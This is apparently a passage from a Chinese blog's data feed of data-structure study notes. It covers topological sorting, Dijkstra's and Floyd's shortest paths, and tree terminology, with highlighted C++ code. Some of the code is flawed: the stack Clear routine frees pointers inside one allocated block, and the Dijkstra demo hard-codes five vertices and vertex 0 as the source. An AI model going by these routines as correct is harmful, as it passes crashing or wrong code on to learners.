<span class="number">5</span>&#125;,</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>&#125;,</span><br><span class="line">        &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行Kruskal算法并输出结果</span></span><br><span class="line">    <span class="built_in">kruskalMST</span>(V, edges, E);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="有向无环图的应用"><a href="#有向无环图的应用" class="headerlink" title="有向无环图的应用"></a>有向无环图的应用</h3><p>有向无环图简称DAG图</p><p>DAG图在工程计划和管理方面应用广泛。</p><h4 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h4><h5 id="基本定义和特点"><a href="#基本定义和特点" class="headerlink" title="基本定义和特点"></a>基本定义和特点</h5><p>顶点活动网：AOV网，将顶点表示活动，边表示活动之间的关系</p><p>拓扑序列：把AOV网中的所有顶点排成可以线性序列，该序列满足：若AOV网中存在从$v_i$到$v_j$的路径，则在该序列中，$v_i$必位于$v_j$之前</p><p>拓扑排序：构造AOV网的拓扑序列的操作被称为拓扑排序</p><p>特点：</p><p>1.一个有向图的拓扑序列不一定唯一</p><p>2.有向无环图一定存在拓扑序列</p><p>3.有向有环图不存在拓扑序列</p><p>4.可以通过构造拓扑序列，判断AOV网是否存在环</p><h5 id="拓扑排序算法的基本思想"><a href="#拓扑排序算法的基本思想" class="headerlink" title="拓扑排序算法的基本思想"></a>拓扑排序算法的基本思想</h5><p>1.在有向图中选一个入度为0的顶点输出</p><p>2。从图中删除该顶点及所有它的出边</p><p>3.重复 1和2 直到所有顶点输出或者图中剩余顶点入度均不为0（此时图中有回路，无法拓扑排序）</p><h5 id="算法概要-2"><a href="#算法概要-2" class="headerlink" title="算法概要"></a>算法概要</h5><p>增加一个存放各顶点入度的数组indegree[]</p><p>1.扫描indegree[]，将入度为0的顶点入栈</p><p>2.while(栈非空){</p><p>​    出栈顶元素$v_i$，并输出；</p><p>​    检查$v_i$的出边表，将每条出边&lt;$v_i$,$v_j$&gt;的终点$v_j$的入度减1，若vj的入度减至0，v$v_j$入栈；</p><p>}</p><p>3.若输出的顶点数小于n则有回路（无法拓扑排序），否则正常结束。</p><p>算法实现：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_INIT_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACKINCREMENT 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;DG,DN,UDG,UDN&#125;GraphKind;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">InfoType</span> &#123;</span><br><span class="line">    <span class="type">int</span> weight;</span><br><span class="line">&#125;InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vertextype</span>&#123;</span><br><span class="line">    <span class="type">char</span> id;</span><br><span class="line">    <span class="type">int</span> No;</span><br><span class="line"> <span class="comment">//   string label;</span></span><br><span class="line">&#125;vertextype;</span><br><span class="line"><span class="comment">//边表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ArcNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> adjvex; <span class="comment">//该弧指向的顶点位置</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ArcNode</span> *nextarc;</span><br><span class="line">    InfoType *info;</span><br><span class="line">&#125;ArcNode;</span><br><span class="line"><span class="comment">//顶点表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vnode</span>&#123;</span><br><span class="line">    vertextype data;</span><br><span class="line">    ArcNode *firstarc;</span><br><span class="line">&#125;vnode,adjlist[MAX_VERTEX_NUM];</span><br><span class="line"><span class="comment">//邻接表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    adjlist vertices;</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">    GraphKind kind;</span><br><span class="line">&#125;ALGraph;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Creatadilist</span><span class="params">(ALGraph &amp;G)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    ArcNode *s;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%d&quot;</span>,&amp;G.vexnum,&amp;G.arcnum,&amp;G.kind);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        cin&gt;&gt;G.vertices[i].data.id;</span><br><span class="line">        G.vertices[i].firstarc=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;G.arcnum;k++)&#123;</span><br><span class="line">        cin&gt;&gt;i&gt;&gt;j;</span><br><span class="line">        s=(ArcNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ArcNode));</span><br><span class="line">        s-&gt;adjvex=j;</span><br><span class="line">        s-&gt;info=<span class="literal">NULL</span>;</span><br><span class="line">        s-&gt;nextarc=G.vertices[i].firstarc;</span><br><span class="line">        G.vertices[i].firstarc=s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SElemType</span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    <span class="type">int</span> *base;</span><br><span class="line">    <span class="type">int</span> *top;</span><br><span class="line">    <span class="type">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    S.base=(<span class="type">int</span>*)<span class="built_in">malloc</span>(STACK_INIT_SIZE*<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span>(!S.base) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    S.top=S.base;</span><br><span class="line">    S.stacksize=STACK_INIT_SIZE;</span><br><span class="line">  <span class="comment">//  cout&lt;&lt;&quot;Init succeed.&quot;&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,<span class="type">int</span> e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top-S.base&gt;=S.stacksize)&#123;</span><br><span class="line">        S.base=(<span class="type">int</span>*)<span class="built_in">realloc</span>(S.base, (S.stacksize+STACKINCREMENT)*<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span>(!S.base) &#123;</span><br><span class="line">       <span class="comment">// cout&lt;&lt;&quot;ERROR&quot;&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    S.top=S.base+S.stacksize;</span><br><span class="line">    S.stacksize+=STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    *S.top++=e;</span><br><span class="line"> <span class="comment">//   cout&lt;&lt;&quot;Push succeed.&quot;&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S,<span class="type">int</span> &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)&#123;</span><br><span class="line">     <span class="comment">//   cout&lt;&lt;&quot;Stack is Empty.&quot;&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        e=*(S.top<span class="number">-1</span>);</span><br><span class="line">        S.top--;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;&quot;Pop succeed.&quot;&lt;&lt;endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clear</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(S.top&gt;S.base)&#123;</span><br><span class="line">        <span class="type">int</span>* p=S.top;</span><br><span class="line">        S.top--;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        S.stacksize-=STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">// cout&lt;&lt;&quot;Stack clear succeed.&quot;&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.base != <span class="literal">NULL</span> )&#123;</span><br><span class="line">        <span class="built_in">Clear</span>(S);</span><br><span class="line">        <span class="built_in">free</span>(S.base);</span><br><span class="line">        S.base = <span class="literal">NULL</span>;</span><br><span class="line">        S.top = <span class="literal">NULL</span>;</span><br><span class="line">        S.stacksize = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//cout &lt;&lt; &quot;Stack destroyed.&quot; &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.base==S.top) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackLength</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(S.base==S.top)) <span class="keyword">return</span> S.top-S.base;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetTop</span><span class="params">(SqStack S,<span class="type">int</span> &amp;e)</span></span>&#123;</span><br><span class="line">    e=*(S.top<span class="number">-1</span>);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;e is:&quot;</span>&lt;&lt;(&amp;e)&lt;&lt;<span class="string">&quot;-&quot;</span>&lt;&lt;(&amp;e)&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackTravers</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">StackEmpty</span>(S))</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Stack is Empty.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!(S.top==S.base))&#123;</span><br><span class="line">        S.top--;</span><br><span class="line">        cout&lt;&lt;i&lt;&lt;<span class="string">&quot;. &quot;</span>;</span><br><span class="line">        cout&lt;&lt;(*(&amp;S.top))&lt;&lt;endl;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;(*(&amp;S.top))-&gt;b&lt;&lt;endl;</span></span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FindInDegree</span><span class="params">(ALGraph G, <span class="type">int</span> indegree[])</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;ArcNode *p;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        p=G.vertices[i].firstarc;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            indegree[p-&gt;adjvex]++;</span><br><span class="line">            p=p-&gt;nextarc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">TopologicalSort</span><span class="params">(ALGraph G)</span></span>&#123;</span><br><span class="line">    SqStack S;</span><br><span class="line">    <span class="type">int</span> count,k,i;</span><br><span class="line">    ArcNode *p;</span><br><span class="line">    <span class="type">int</span> indegree[MAX_VERTEX_NUM]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">FindInDegree</span>(G, indegree);</span><br><span class="line">    <span class="built_in">InitStack</span>(S);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!indegree[i]) <span class="built_in">Push</span>(S, i);</span><br><span class="line">    &#125;</span><br><span class="line">    count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">StackEmpty</span>(S))&#123;</span><br><span class="line">        <span class="built_in">Pop</span>(S,i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,i,G.vertices[i].data.No);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">for</span>(p=G.vertices[i].firstarc;p;p=p-&gt;nextarc)&#123;</span><br><span class="line">            k=p-&gt;adjvex;</span><br><span class="line">            <span class="keyword">if</span>(!(--indegree[k])) <span class="built_in">Push</span>(S, k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(count&lt;G.vexnum)<span class="keyword">return</span> ERROR;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h3><h4 id="问题提出"><a href="#问题提出" class="headerlink" title="问题提出"></a>问题提出</h4><p>路径长度：路径上边的权值之和</p><p>最短路径：两结点间权值之和最小的路径</p><h4 id="单源最短路径Dijkstra"><a href="#单源最短路径Dijkstra" class="headerlink" title="单源最短路径Dijkstra"></a>单源最短路径Dijkstra</h4><p>给定有向图G和源点$v_i$，求$v_i$到G中其余各顶点的最短路径</p><h5 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h5><p>按路径长度的递增次序，逐步产生最短路径Dijkstra算法(SPF算法)</p><p>首先求出长度最短的一条路径，再参照它求出长度次短的一条最短路径，以此类推，直到从顶点v到其他各顶点的最短路径全部求出为止</p><h5 id="算法要点"><a href="#算法要点" class="headerlink" title="算法要点"></a>算法要点</h5><p>例图：<img src="/2023/11/21/单源最小路径示例.png" alt="单源最小路径"><br>1.设源点$v_0$，顶点集合分成两部分：</p><p>U：已经求出最短路径的顶点集合</p><p>V-U：未求出最短路径的顶点集合</p><p>初值：U={$v_0$},V-U={$v_1$,$v_2$,$v_3$,$v_4$}</p><p>第二个加入U中的顶点必然是与$v_0$邻接且与$v_0$之间的边长最短的顶点</p><p>2.U={$v_0$,$v_2$}，V-U={$v_1$,$v_3$,$v_4$}</p><p>设第三个加入U中的顶点是w$\in$V-U,则w到$v_0$的最短路径的特点是：w是V-U中满足$v_0$-&gt;w和$v_0$-&gt;$v_2$-&gt;w中最短的</p><h5 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> vexs[MAX_VERTEX_NUM];</span><br><span class="line">    <span class="type">float</span> arcs[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125;MGraph;</span><br></pre></td></tr></table></figure><h5 id="算法概要-3"><a href="#算法概要-3" class="headerlink" title="算法概要"></a>算法概要</h5><p>1.引入辅助数组D[ ],D[i]表示当前所找到的源点到每个终点i的最短路径长度，最短路径的初值即有向边的权值D[i]=G.arcs[$v_0$] [i]</p><p>​    引入辅助数组final[ ],final[i]=1表示顶点i的最短路径已经求出，否则未求出</p><p>​    初始状态：final[$v_0$]标志为1，其余为0</p><p>​    引入数组P[ ]来记录路径</p><p>2.选择D[ ]中路径最小值的顶点v(已经求出最短路的顶点除外)</p><p>​    v就是当前求得得一条从$v_0$出发的最短路径的终点，修改final[v]=1</p><p>3.修改未求出最短路径的顶点的最短路径长度，如果D[v]+G.arcs[v] [w]&lt;D[w]</p><p>​    则修改D[w]，D[w]=D[v]+G.arcs[v] [w]</p><p>​    同时修改P[w]=v</p><p>4.重复2 ，3操作 n-1次，求得最短路径长度递增序列</p><h5 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  dijkstra</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFINITY 1000</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="keyword">struct</span> <span class="title class_">ArcCell</span> &#123;</span><br><span class="line">    <span class="type">int</span> adj;</span><br><span class="line">&#125;ArcCell,AdjMatrix[MAX_VERTEX_NUM];</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> vexs[MAX_VERTEX_NUM];</span><br><span class="line">   <span class="comment">// AdjMatrix arcs;</span></span><br><span class="line">    <span class="type">float</span> arcs[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125;MGraph;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShortestPath_DIJ</span><span class="params">(MGraph G,<span class="type">int</span> v0,<span class="type">int</span> *P,<span class="type">float</span> *D)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,v,w,min,f[MAX_VERTEX_NUM];</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        f[v]=<span class="number">0</span>;</span><br><span class="line">        D[v]=G.arcs[v0][v];</span><br><span class="line">       </span><br><span class="line">        P[v]=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(D[v]&lt;INFINITY) P[v]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    f[<span class="number">0</span>]=<span class="number">1</span>;P[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">        cout&lt;&lt;D[j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">        cout&lt;&lt;f[j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">        cout&lt;&lt;P[j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;G.vexnum;++i)&#123;</span><br><span class="line">        min=INFINITY;</span><br><span class="line">        <span class="keyword">for</span>(w=<span class="number">0</span>;w&lt;G.vexnum;++w)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!f[w])</span><br><span class="line">                <span class="keyword">if</span>(D[w]&lt;min)&#123;v=w;min=D[w];&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f[v]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(w=<span class="number">0</span>;w&lt;G.vexnum;++w)&#123;</span><br><span class="line">            <span class="keyword">if</span>((!f[w])&amp;&amp;(min+G.arcs[v][w]&lt;D[w]))&#123;</span><br><span class="line">                D[w]=min+G.arcs[v][w];</span><br><span class="line">                P[w]=v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> pre;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%.0f:%d&quot;</span>,D[i],i); <span class="comment">//这里因为测试的都用的整数，直接舍去小数输出了</span></span><br><span class="line">        pre=P[i];</span><br><span class="line">        <span class="keyword">while</span>(pre!=<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;&lt;-%d&quot;</span>,pre);</span><br><span class="line">            pre=P[pre];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    MGraph G;</span><br><span class="line">    G.vexnum=<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">            G.arcs[i][j]=INFINITY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    G.arcs[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">3</span>][<span class="number">3</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">4</span>][<span class="number">4</span>]=<span class="number">0</span>;</span><br><span class="line">    G.arcs[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">6</span>;</span><br><span class="line">    G.arcs[<span class="number">0</span>][<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">    G.arcs[<span class="number">1</span>][<span class="number">3</span>]=<span class="number">5</span>;</span><br><span class="line">    G.arcs[<span class="number">2</span>][<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">    G.arcs[<span class="number">2</span>][<span class="number">3</span>]=<span class="number">3</span>;</span><br><span class="line">    G.arcs[<span class="number">2</span>][<span class="number">4</span>]=<span class="number">4</span>;</span><br><span class="line">    G.arcs[<span class="number">3</span>][<span class="number">4</span>]=<span class="number">2</span>;</span><br><span class="line">    <span class="type">float</span> *D = <span class="keyword">new</span> <span class="type">float</span>[G.vexnum]; <span class="comment">// 动态分配内存</span></span><br><span class="line">    <span class="type">int</span> *P = <span class="keyword">new</span> <span class="type">int</span>[G.vexnum];</span><br><span class="line">    <span class="built_in">ShortestPath_DIJ</span>(G, <span class="number">0</span>, P,D);</span><br><span class="line">    <span class="keyword">delete</span>[] D; <span class="comment">// 释放内存</span></span><br><span class="line">    <span class="keyword">delete</span>[] P;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h5><p>Dijkstra算法的时间复杂行主要体现在求每个顶点的最短路径是，需要修改距离和求最小值，时间复杂性O($n^2$)</p><p>Dijkstra算法的空间复杂性主要体现在辅助数组，空间复杂性为O(n)</p><h4 id="每一对顶点之间的最短路径"><a href="#每一对顶点之间的最短路径" class="headerlink" title="每一对顶点之间的最短路径"></a>每一对顶点之间的最短路径</h4><p>依次把有向网络的每个顶点作为源点，重复执行Dijkstra算法n次，即可求得每对顶点之间的最短路径</p><p>Floyd算法 可以直接求出所有顶点之间的最短路径</p><h5 id="算法思想-1"><a href="#算法思想-1" class="headerlink" title="算法思想"></a>算法思想</h5><p>对顶点进行编号，设顶点为0,1,…,n-1，算法采用邻接矩阵G.arcs[n] [n]表示有向网络</p><p>$D^{(-1)}[n][n]$表示中间不经过任何点的最短路径；即邻接矩阵</p><p>$D^{(0)}[n][n]$表示只允许经过0号顶点的最短路径</p><p>$D^{(1)}[n][n]$表示只允许经过0号和1号顶点的最短路径</p><p>$…….$</p><p>$D^{(n-1)}[n][n]$表示可经过所有顶点的最短路径</p><p>基本想法：动态规划算法</p><p>如果$v_i$与$v_j$之间有一条路径，但不一定最短，也许经过某些中间点会使路径长度更短，尝试在原路径中加入其他顶点作为中间顶点</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】树与二叉树</title>
      <link href="/2023/11/14/"/>
      <url>/2023/11/14/</url>
      
        <content type="html"><![CDATA[<h3 id="树的定义和基本术语"><a href="#树的定义和基本术语" class="headerlink" title="树的定义和基本术语"></a>树的定义和基本术语</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>树是n(n&gt;=0)个结点的有限集。</p><p>(1)<strong>有且仅有</strong>一个特定的称为根的结点</p><p>(2)n&gt;1时，其他结点可以分为m个不相交的有限集，其中每个集合也构成一颗树，称为根的子树。</p><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>(1)树的根结点没有前驱，其他结点有且仅有一个前驱。</p><p>(2)树中任何一个结点可以有零或多个后继结点。</p><h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><p>1.结点(node)</p><p>2.结点的度(degree)</p><p>3.树的度</p><p>4.叶子或终端结点</p><p>5.非终端结点</p><p>6.父(双)亲结点(parent)</p><p>7.儿(孩)子结点(child)</p><p>8.兄弟结点(sibling)</p><p>9.路径</p><p>10.祖先</p><p>11.子孙(后代)</p><p>12.结点的层数(level)</p><p>12.树的深度(depth)或高度</p><p>14.有序树和无序树</p><p>15.森林(forest): 是m(m&gt;=0)棵互不相交的树的集合</p><h4 id="树的表示方法"><a href="#树的表示方法" class="headerlink" title="树的表示方法"></a>树的表示方法</h4><p>1.图</p><p>2.嵌套集合</p><p>3.广义表形式： (A(B(D),C))</p><p>4.凹入表示法</p><h3 id="树的有关概念"><a href="#树的有关概念" class="headerlink" title="树的有关概念"></a>树的有关概念</h3><h4 id="树的抽象数据类型"><a href="#树的抽象数据类型" class="headerlink" title="树的抽象数据类型"></a>树的抽象数据类型</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ADT Tree&#123;</span><br><span class="line">    数据对象D:D是具有相同特性的元素的集合。</span><br><span class="line">  数据关系R:若D为空集,则称为空树;否则:</span><br><span class="line">                  (<span class="number">1</span>)在D中存在唯一的称为根的数据元素，则R集为空;</span><br><span class="line">                (<span class="number">2</span>)当n&gt;<span class="number">1</span>时,其余结点n&gt;<span class="number">1</span>时，其他结点可以分为m个不相交的有限集，其中每个集合也是一颗符合本定义的树，称为根root的子树。</span><br><span class="line">  基本操作P:查找类、插入类、删除类操作。                                 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="树的基本操作类"><a href="#树的基本操作类" class="headerlink" title="树的基本操作类"></a>树的基本操作类</h4><p>查找类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Root(T)//求树的根结点</span><br><span class="line">Value(T,cur_e)//求当前结点的元素值</span><br><span class="line">Parent(T,cur_e)//求当前结点的双亲结点</span><br><span class="line">LeftChild(T,cur_e)//求当前结点的最左孩子</span><br><span class="line">RightSibling(T,cur_e)//求当前结点的右兄弟</span><br><span class="line">TreeEmpty(T)//判断树是否为空</span><br><span class="line">TreeDepth(T)//求树的高度</span><br><span class="line">TraverseTree(T,Visit())//遍历</span><br></pre></td></tr></table></figure><p>插入类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 